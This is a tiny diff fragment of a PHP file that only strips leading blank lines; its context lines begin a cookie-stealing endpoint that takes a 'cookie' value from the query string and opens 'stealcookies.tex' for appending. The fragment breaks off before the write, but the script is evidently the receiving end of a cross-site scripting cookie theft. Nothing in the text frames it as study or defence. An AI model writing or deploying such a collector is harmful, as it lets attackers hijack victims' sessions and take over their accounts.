@@ -1,8 +1,3 @@
-
-
-
-
-
 <?php
 $cookie=$_GET['cookie'];
 $file=fopen('stealcookies.tex', 'a');
